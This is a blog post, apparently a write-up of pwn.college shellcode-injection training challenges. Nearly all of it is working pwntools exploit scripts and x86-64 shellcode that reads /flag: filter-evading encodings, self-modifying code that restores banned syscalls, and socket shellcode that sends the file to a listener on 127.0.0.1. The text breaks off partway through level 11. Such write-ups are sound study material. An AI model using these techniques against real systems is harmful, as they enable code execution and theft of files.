
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
        <title>shellcodeORW | Moyao の小屋</title>
        <meta name="author" content="Moyao">
        <meta name="description" content="Write down something interesting I met
feel free to mail me if you have something wanted to talk about
mail: &lt;moyaoxue@outlook.com&gt;
">
        <meta name="keywords" content="">
        <link rel="icon" href="/images/head.jpg">
        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
        <script src="https://cdn.staticfile.org/font-awesome/6.1.1/js/all.min.js"></script>
        
        <link rel="stylesheet" href="/css/fonts.min.css">
        <link rel="stylesheet" href="/css/particlex.css">
        
        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
    <meta name="generator" content="Hexo 6.2.0"></head>
    <body>
        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:200;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:50vmin;height:50vmin;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #a3ddfb;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">加载过慢请开启缓存(浏览器默认开启)</p><div><img alt="loading" src="/loading.gif"></div></div></div></div></div>
        <div id="layout">
            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
            <transition name="into">
                <div v-show="show_page" style="display: -not-none">
                    <div id="menu_show">
                         
<nav id="menu">
    <div class="desktop-menu">
        <a href="/">
            <span class="title">Moyao の小屋</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;home</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;about</span>
        </a>
        
        <a target="_blank" rel="noopener" href="//tags/re/">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;tags</span>
        </a>
        
    </div>
    <div :class="'phone-menu ' + menu_show" id="phone-menu">
        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
        <div :class="'title'" @click="menu_show = !menu_show">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;Moyao の小屋</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="menu_show">
            
            <a href="">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">home</div>
                </div>
            </a>
            
            <a href="">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">about</div>
                </div>
            </a>
            
            <a href="/tags/re/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">tags</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>
                    </div>
                    <div id="main">
                        
<div class="article">
    <div>
        <h1>shellcodeORW </h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
            </span>
            2024/3/5
        </span>
        
        
    </div>
    <div class="content" v-pre>
        <h6 id="PREFACE-pwn-college的shellcode-injection，算是一个小入门"><a href="#PREFACE-pwn-college的shellcode-injection，算是一个小入门" class="headerlink" title="PREFACE: pwn.college的shellcode injection，算是一个小入门~"></a>PREFACE: pwn.college的shellcode injection，算是一个小入门~</h6><span id="more"></span>

<!-- 看了眼discord，不许开writeup，就隐藏了：> -->


<h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>basic orw：</p>
<pre><code class="python">from pwn import *
from string import *
# context.syntax = &#39;intel&#39;
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()
# print(flag_file)

shellcode = f&#39;&#39;&#39;
// close:
    mov rdi, 2
    mov rax, 3
    syscall

// open:
    mov rbx, 0x&#123;flag_file&#125;
    mov rsi, 0
    mov rdx, 0
    push rbx
    push rsp
    pop rdi
    mov rax, 2
    syscall

// read:
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x50
    xor rax, rax
    syscall

// write:
    mov rdx, rax
    mov rdi, 1
    mov rsi, rsp
    mov rax, 1
    syscall

// exit:
    mov rax, 0x3c
    syscall
&#39;&#39;&#39;
hex_shellcode = asm(shellcode)
# print(hex_shellcode)
p = gdb.debug(&#39;./level1_chall&#39;,&#39;b *main + 560\nb *main + 709&#39;)
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,hex_shellcode + b&#39;\n&#39;)
# p.send(hex_shellcode + b&#39;\n&#39;)
p.interactive()
</code></pre>
<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>随机跳一段，全nop即可</p>
<pre><code class="python">from pwn import *
from string import *
# context.syntax = &#39;intel&#39;
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()
# print(flag_file)

shellcode = f&#39;&#39;&#39;
// close:
    mov rdi, 2
    mov rax, 3
    syscall

// open:
    mov rbx, 0x&#123;flag_file&#125;
    mov rsi, 0
    mov rdx, 0
    push rbx
    push rsp
    pop rdi
    mov rax, 2
    syscall

// read:
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x50
    xor rax, rax
    syscall

// write:
    mov rdx, rax
    mov rdi, 1
    mov rsi, rsp
    mov rax, 1
    syscall

// exit:
    mov rax, 0x3c
    syscall
&#39;&#39;&#39;
hex_shellcode = asm(shellcode)
# print(hex_shellcode)
p = gdb.debug(&#39;./level2_chall&#39;,&#39;b *main + 910&#39;)
# while (True):
#     p = process(&#39;./level2_chall&#39;)
#     p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,0x700 * b&#39;\90&#39; + hex_shellcode + b&#39;\n&#39;)
#     # p.send(hex_shellcode + b&#39;\n&#39;)
#     print(p.recv())
#     if (b&#39;flag&#39; in p.recv()):
#         print(p.recv())
#         break
#     p.close()
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,0x700 * b&#39;\x90&#39; + hex_shellcode + b&#39;\n&#39;)
p.interactive()
</code></pre>
<h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>禁用<code>\x00</code></p>
<pre><code class="python">from pwn import *
from string import *
# context.syntax = &#39;intel&#39;
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()
# print(flag_file)

shellcode = f&#39;&#39;&#39;
// close:
    xor rdx, rdx
    xor rdi, rdi
    xor rax, rax
    mov dil, 2
    mov al, 3
    syscall

// open:
    xor rsi, rsi
    xor rdx, rdx
    sub rsp, 5
    mov byte ptr [rsp], 0x2f
    mov byte ptr [rsp+1], 0x66
    mov byte ptr [rsp+2], 0x6c
    mov byte ptr [rsp+3], 0x61
    mov byte ptr [rsp+4], 0x67
    mov byte ptr [rsp+5], 0x01
    sub byte ptr [rsp+5], 0x01
    push rsp
    pop rdi
    mov al, 2
    syscall

// read:    
    mov rdi, rax
    mov rsi, rsp
    mov dl, 0x50
    xor rax, rax
    syscall

// write:
    mov rdx, rax
    mov al, 1
    push rax
    pop rdi
    mov rsi, rsp
    mov al, 1
    syscall
// exit:
    mov al, 0x3c
    syscall
&#39;&#39;&#39;
hex_shellcode = asm(shellcode)
# print(hex_shellcode)
p = gdb.debug(&#39;./level2_chall&#39;,&#39;b *main + 910&#39;)
# while (True):
#     p = process(&#39;./level2_chall&#39;)
#     p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,0x700 * b&#39;\90&#39; + hex_shellcode + b&#39;\n&#39;)
#     # p.send(hex_shellcode + b&#39;\n&#39;)
#     print(p.recv())
#     if (b&#39;flag&#39; in p.recv()):
#         print(p.recv())
#         break
#     p.close()
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,0x700 * b&#39;\x90&#39; + hex_shellcode + b&#39;\n&#39;)
p.interactive()
</code></pre>
<h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>ban ‘H’，不能用xor和mov等，用push pop代替赋值即可</p>
<pre><code class="python">from pwn import *
from string import *
# context.syntax = &#39;intel&#39;
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()
# print(flag_file)

shellcode = f&#39;&#39;&#39;
// close:
    push 0
    pop rdx
    push 0
    pop rdi
    push 0
    pop rdx
    mov dil, 2
    mov al, 3
    syscall
    nop
    
// open:
    push 0
    pop rsi
    push 0
    pop rdx
    nop
    push 0
    push 0
    push 0
    push 0
    push 0
    nop
    mov byte ptr [rsp], 0x2f
    mov byte ptr [rsp+1], 0x66
    mov byte ptr [rsp+2], 0x6c
    mov byte ptr [rsp+3], 0x61
    mov byte ptr [rsp+4], 0x67
    mov byte ptr [rsp+5], 0x01
    sub byte ptr [rsp+5], 0x01
    push rsp
    pop rdi
    mov al, 2
    syscall
    nop
// read:    
    push rax
    pop rdi
    push rsp
    pop rsi
    mov dl, 0x50
    push 0
    pop rax
    syscall
    nop
// write:
    push rax
    pop rdx
    mov al, 1
    push rax
    pop rdi
    push rsp
    pop rsi
    mov al, 1
    syscall
// exit:
    mov al, 0x3c
    syscall
&#39;&#39;&#39;
hex_shellcode = asm(shellcode)
# print(hex_shellcode)
# p = gdb.debug(&#39;./level2_chall&#39;,&#39;b *main + 910&#39;)
p = process(&#39;/challenge/babyshell_level4&#39;)
# while (True):
#     p = process(&#39;./level2_chall&#39;)
#     p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,0x700 * b&#39;\90&#39; + hex_shellcode + b&#39;\n&#39;)
#     # p.send(hex_shellcode + b&#39;\n&#39;)
#     print(p.recv())
#     if (b&#39;flag&#39; in p.recv()):
#         print(p.recv())
#         break
#     p.close()
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,0x700 * b&#39;\x90&#39; + hex_shellcode + b&#39;\n&#39;)
p.interactive()
# p.recv()
</code></pre>
<h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p>ban syscall等，得smc拿（代码写复杂了，可以直接获取rip的，不过一时没想起来就用了他的leak来找地址）</p>
<pre><code class="python">from pwn import *
from string import *
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()

# p = gdb.debug(&#39;./level5_chall&#39;,&#39;b *main\nb *main + 873&#39;)
p = process(&#39;./level5_chall&#39;)
p.recvuntil(&#39;[LEAK] Mapping shellcode memory at &#39;)
leak_addr = p.recvn(10).decode()
leak_addr = int(leak_addr, 16)

# close
shellcode = b&#39;&#39;
shellcode_close = &#39;&#39;&#39;
    xor rdi, rdi
    xor rdx, rdx
    xor rax, rax
    xor rsi,rsi
    mov dil, 2
    mov al, 3
&#39;&#39;&#39;
shellcode_close = asm(shellcode_close)
shellcode += shellcode_close
syscall = &#39;&#39;&#39;
    syscall
&#39;&#39;&#39;
syscall = asm(syscall)
after_syscall = bytes(a ^ b for a,b in zip(b&#39;\x90\x90&#39;, syscall))
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)

# open
shellcode_open = &#39;&#39;&#39;
    mov al, 2
    xor rdx, rdx
    xor rsi, rsi
    mov rbx, 0x0067616c662f
    push rbx
    push rsp
    pop rdi
&#39;&#39;&#39;
shellcode_open = asm(shellcode_open)
shellcode += shellcode_open
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)

# read
shellcode_read = &#39;&#39;&#39;
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    mov al, 0
&#39;&#39;&#39;
shellcode_read = asm(shellcode_read)
shellcode += shellcode_read
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)

# write
shellcode_write = &#39;&#39;&#39;
    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov al, 1
&#39;&#39;&#39;
shellcode_write = asm(shellcode_write)
shellcode += shellcode_write
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)

shellcode_exit = &#39;&#39;&#39;
    mov rax, 60
&#39;&#39;&#39;
shellcode_exit = asm(shellcode_exit)
shellcode += shellcode_exit
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)
# print(&#39;--------------------------------------&#39;)
# print(disasm(shellcode))
# print(&#39;--------------------------------------&#39;)
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,shellcode + b&#39;\n&#39;)
p.interactive()
</code></pre>
<h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p>比起上一题多了禁用前0x1000的write，不过长度够可以直接绕</p>
<pre><code>.rept 0x1000
    nop
.endr
</code></pre>
<pre><code class="python">from pwn import *
from string import *
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;],log_level=&#39;debug&#39;)
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()

p = gdb.debug(&#39;./level6_chall&#39;,&#39;b *main\nb *main + 957\nb *main + 525&#39;)
# p = process(&#39;./level6_chall&#39;)
p.recvuntil(&#39;[LEAK] Mapping shellcode memory at &#39;)
leak_addr = p.recvn(10).decode()
leak_addr = int(leak_addr, 16)

# close
shellcode = &#39;&#39;&#39;
.rept 0x1000
nop
.endr
&#39;&#39;&#39;
shellcode = asm(shellcode)
shellcode_close = &#39;&#39;&#39;
    xor rdi, rdi
    xor rdx, rdx
    xor rax, rax
    xor rsi,rsi
    mov dil, 2
    mov al, 3
&#39;&#39;&#39;
shellcode_close = asm(shellcode_close)
shellcode += shellcode_close
syscall = &#39;&#39;&#39;
    syscall
&#39;&#39;&#39;
syscall = asm(syscall)
after_syscall = bytes(a ^ b for a,b in zip(b&#39;\x90\x90&#39;, syscall))
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)

# open
shellcode_open = &#39;&#39;&#39;
    mov al, 2
    xor rdx, rdx
    xor rsi, rsi
    mov rbx, 0x0067616c662f
    push rbx
    push rsp
    pop rdi
&#39;&#39;&#39;
shellcode_open = asm(shellcode_open)
shellcode += shellcode_open
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)

# read
shellcode_read = &#39;&#39;&#39;
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    mov al, 0
&#39;&#39;&#39;
shellcode_read = asm(shellcode_read)
shellcode += shellcode_read
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)

# write
shellcode_write = &#39;&#39;&#39;
    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov al, 1
&#39;&#39;&#39;
shellcode_write = asm(shellcode_write)
shellcode += shellcode_write
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)

shellcode_exit = &#39;&#39;&#39;
    mov rax, 60
&#39;&#39;&#39;
shellcode_exit = asm(shellcode_exit)
shellcode += shellcode_exit
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)
p.sendafter(&#39;Reading 0x2000 bytes from stdin.\n&#39;,shellcode + b&#39;\n&#39;)
# h = p.recv(0x2000)
# print(h)
p.interactive()
</code></pre>
<h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>ban stdin stdout stderr，这里用socket来传</p>
<p>开server接：</p>
<pre><code class="python">import socket

def start_server(host=&#39;0.0.0.0&#39;, port=5678):
    while(True):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        server_socket.bind((host, port))

        server_socket.listen(5)
        print(f&quot;Listening on &#123;host&#125;:&#123;port&#125;...&quot;)

        client_socket, addr = server_socket.accept()
        print(f&quot;Accepted a connection from &#123;addr&#125;&quot;)

        data = client_socket.recv(1024)
        print(&quot;Received data:&quot;, data.decode())

        client_socket.close()
        server_socket.close()

if __name__ == &quot;__main__&quot;:
    start_server()
</code></pre>
<p>exp:</p>
<pre><code class="python">from pwn import *
from string import *
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()

# p = gdb.debug(&#39;./level6_chall&#39;,&#39;b *main\nb *main + 957\nb *main + 525&#39;)
p = process(&#39;/challenge/babyshell_level7&#39;)
p.recvuntil(&#39;Mapped 0x4000 bytes for shellcode at &#39;)
leak_addr = p.recvn(10).decode()
leak_addr = int(leak_addr, 16)
shellcode = &#39;&#39;&#39;
// socket:
    mov rdi, 2
    mov rsi, 1
    xor rdx, rdx
    mov rax, 41
    syscall

    mov rdi, rax
    mov r9, rax

//  socket addr preparation
    sub rsp, 4
    mov word ptr [rsp + 0], 2
    mov word ptr [rsp + 2], 0x2e16
    mov dword ptr [rsp + 4], 0x0100007f

    push rsp
    pop rsi

//  connect
    mov rdx, 16
    mov rax, 42
    syscall

//    mov rcx, rax // socket descriptor
    mov rcx, rdi

// close:
    mov rdi, 2
    mov rax, 3
    syscall

// open:
    mov rbx, 0x0067616c662f
    mov rsi, 0
    mov rdx, 0
    push rbx
    push rsp
    pop rdi
    mov rax, 2
    syscall

// read:
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x50
    xor rax, rax
    syscall


// write:
    mov rdx, rax
    xor rdi, rdi
    mov rdi, r9
    mov rsi, rsp
    mov rax, 1
    syscall

    mov rdi, rax
    mov rax, 3
    syscall

// exit
    mov rax, 59
    syscall
&#39;&#39;&#39;
shellcode = asm(shellcode)
p.sendafter(&#39;Reading 0x4000 bytes from stdin.\n&#39;,shellcode + b&#39;\n&#39;)
# h = p.recv(0x2000)
# print(h)
p.interactive()
</code></pre>
<h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p>0x12 bytes，用的是chmod(‘file’,7)，<code>ln -s /flag f</code>软链接到f上来节约字符</p>
<pre><code>.intel_syntax noprefix
.text
.globl _start
_start:
    mov al, 0x5a
    mov sil, 7
    push 0x66     
    push rsp
    pop rdi
    syscall
</code></pre>
<blockquote>
<p>cat flag</p>
</blockquote>
<h3 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h3><p>每十个会CC十个，那么写一个生成shellcode，使得超过10个的时候会加入一个jmp（注意不能用qword mov这种大于等于八字节的指令，算是这题隐性的ban list）：</p>
<pre><code class="python">from pwn import *
from string import *
from random import *
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;)
shellcode = f&#39;&#39;&#39;    mov rdi, 2
    mov rax, 3
    syscall
    xor rsi, rsi
    xor rdx, rdx
    sub rsp, 5
    mov byte ptr [rsp], 0x2f
    mov byte ptr [rsp+1], 0x66
    mov byte ptr [rsp+2], 0x6c
    mov byte ptr [rsp+3], 0x61
    mov byte ptr [rsp+4], 0x67
    mov byte ptr [rsp+5], 0x01
    sub byte ptr [rsp+5], 0x01
    push rsp
    pop rdi
    mov al, 2
    syscall
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x50
    xor rax, rax
    syscall
    mov rdx, rax
    mov dil, 1
    mov rsi, rsp
    mov al, 1
    syscall
    mov rax, 0x3c
    syscall&#39;&#39;&#39;
shellcode_list = shellcode.splitlines()
# print(shellcode_list)
shellcode_tmp = &#39;&#39;
shellcode_len = 0
shellcode_pad_flag = 0
i = 0
while (i &lt; len(shellcode_list)):
    # print(f&#39;shellcode_tmp [&#123;i&#125;]: \n&#39;,shellcode_tmp)
    if ((shellcode_len // 10) % 2 == 0 and shellcode_pad_flag == 1):
        if (shellcode_len % 10 &lt;= 8):
            random_str = &#39;&#39;.join(choices(string.ascii_letters, k=4))
            pad = -(shellcode_len % 10) + 8 + 10
            shellcode_tmp += f&quot;    jmp &#123;random_str&#125;\n    .rept &#123;pad&#125;\n    nop\n    .endr\n&#123;random_str&#125;:\n&quot;
            shellcode_len += pad + 2
            shellcode_pad_flag = 0
        else:
            shellcode_pad_flag = 1
            shellcode_len -= len(asm(shellcode_list[i - 1]))
            tmp = shellcode_tmp.splitlines()
            tmp = tmp[:-1]
            shellcode_tmp = &#39;\n&#39;.join(tmp)
            shellcode_tmp += &#39;\n&#39;
            i -= 1
        
    elif ((shellcode_len // 10) % 2 == 0 and shellcode_pad_flag == 0):
        shellcode_tmp += shellcode_list[i] + &#39;\n&#39;
        shellcode_len += len(asm(shellcode_list[i]))
        i += 1
        
    elif ((shellcode_len // 10) % 2 == 1):
        shellcode_len -= len(asm(shellcode_list[i - 1]))
        tmp = shellcode_tmp.splitlines()
        tmp = tmp[:-1]
        shellcode_tmp = &#39;\n&#39;.join(tmp)
        shellcode_tmp += &#39;\n&#39;
        i -= 1
        shellcode_pad_flag = 1
        
    
print(shellcode_tmp)
</code></pre>
<p>生成的exp</p>
<pre><code class="python">from pwn import *
from string import *
from random import *
# context.syntax = &#39;intel&#39;
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()
# print(flag_file)

shellcode = f&#39;&#39;&#39;    mov rdi, 2
    jmp EIBi
    .rept 11
    nop
    .endr
EIBi:
    mov rax, 3
    jmp wIoJ
    .rept 11
    nop
    .endr
wIoJ:
    syscall
    xor rsi, rsi
    xor rdx, rdx
    jmp GGxU
    .rept 10
    nop
    .endr
GGxU:
    sub rsp, 5
    mov byte ptr [rsp], 0x2f
    jmp HIQh
    .rept 10
    nop
    .endr
HIQh:
    mov byte ptr [rsp+1], 0x66
    jmp hAbJ
    .rept 13
    nop
    .endr
hAbJ:
    mov byte ptr [rsp+2], 0x6c
    jmp bxUa
    .rept 13
    nop
    .endr
bxUa:
    mov byte ptr [rsp+3], 0x61
    jmp JNPB
    .rept 13
    nop
    .endr
JNPB:
    mov byte ptr [rsp+4], 0x67
    jmp GoxX
    .rept 13
    nop
    .endr
GoxX:
    mov byte ptr [rsp+5], 0x01
    jmp xzHp
    .rept 13
    nop
    .endr
xzHp:
    sub byte ptr [rsp+5], 0x01
    push rsp
    pop rdi
    jmp UTod
    .rept 11
    nop
    .endr
UTod:
    mov al, 2
    syscall
    mov rdi, rax
    jmp Imgn
    .rept 11
    nop
    .endr
Imgn:
    mov rsi, rsp
    jmp EDoc
    .rept 15
    nop
    .endr
EDoc:
    mov rdx, 0x50
    jmp qLZG
    .rept 11
    nop
    .endr
qLZG:
    xor rax, rax
    syscall
    mov rdx, rax
    jmp AbtY
    .rept 10
    nop
    .endr
AbtY:
    mov dil, 1
    mov rsi, rsp
    mov al, 1
    jmp UuTH
    .rept 10
    nop
    .endr
UuTH:
    syscall
    mov rax, 0x3c
    syscall&#39;&#39;&#39;

hex_shellcode = asm(shellcode)
print(hex_shellcode)
p = gdb.debug(&#39;./level9_chall_cp&#39;,&#39;b *main\nb *main + 912&#39;)
# p = process(&#39;./level9_chall_cp&#39;)
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,hex_shellcode + b&#39;\n&#39;)
# p.send(hex_shellcode + b&#39;\n&#39;)
p.interactive()
</code></pre>
<h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>要求从小到大，可以开始查一些单字节双字节指令插进去（这题用的多的是nop）</p>
<pre><code class="python">from pwn import *
from string import *
from random import *
# context.syntax = &#39;intel&#39;
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()
# print(flag_file)

shellcode = f&#39;&#39;&#39;
//  open
    mov rbx, 0x67616c662f
    nop
    xor rsi, rsi
    xor rdx, rdx
    mov al, 2
    push rbx
    push rsp
    nop
    nop
    pop rdi
    syscall
    nop

// read
    mov rdi, rax
    mov rsi, rsp
    nop
    nop
    nop
    nop
    mov dl, 0x50
    nop
    xor rax, rax

    syscall
    
// write
    nop
    nop
    nop
    mov dil, 1
    nop
    nop
    nop
    nop
    nop
    nop
    mov rsi, rsp
    mov rdx, rax
    mov al, 1
    syscall
    nop
    nop
    inc rax
&#39;&#39;&#39;

hex_shellcode = asm(shellcode)
print(hex_shellcode)
# p = gdb.debug(&#39;./level9_chall_cp&#39;,&#39;b *main\nb *main + 912&#39;)
p = process(&#39;./level10_chall&#39;)
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,hex_shellcode + b&#39;\n&#39;)
# p.send(hex_shellcode + b&#39;\n&#39;)
p.interactive()
</code></pre>
<h3 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h3><p>用的socket，和上题一样但是长很多所以调整更多</p>
<pre><code class="python">from pwn import *
from string import *
from random import *
# context.syntax = &#39;intel&#39;
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()
# print(flag_file)

shellcode = f&#39;&#39;&#39;
// socket:
    xor rdi, rdi
    xor rsi, rsi
    xor rax, rax
    mov dil, 2
    mov sil, 1
    xor rdx, rdx
    mov al, 41
    syscall

    nop
    mov rdi, rax
    nop
    nop
    nop
    nop
    nop
    mov r9, rax
    
//  socket addr preparation
    nop
    sub rsp, 4
    mov word ptr [rsp + 0], 2
    nop
    nop
    mov word ptr [rsp + 2], 0x2e16
    nop
    nop
    mov word ptr [rsp + 4], 0x007f
    xchg eax, ecx
    mov word ptr [rsp + 6], 0x0100
    xchg eax, ecx

    push rsp
    pop rsi

//  connect
    mov dl, 16
    mov al, 42
    xchg eax, ecx
    xchg ecx, eax
    syscall

    mov rcx, rdi
    nop
    xchg eax, ecx
    xchg ecx, eax

// open:
    xor rsi, rsi
    xor rdx, rdx
    xchg eax, ecx
    xchg eax, ecx
    sub rsp, 5
    xchg eax, ecx
    xchg eax, ecx
    xchg eax, edx
    xchg eax, edx
    mov byte ptr [rsp], 0x2f
    xchg eax, edx
    xchg eax, edx
    xchg eax, edx
    xchg eax, edx
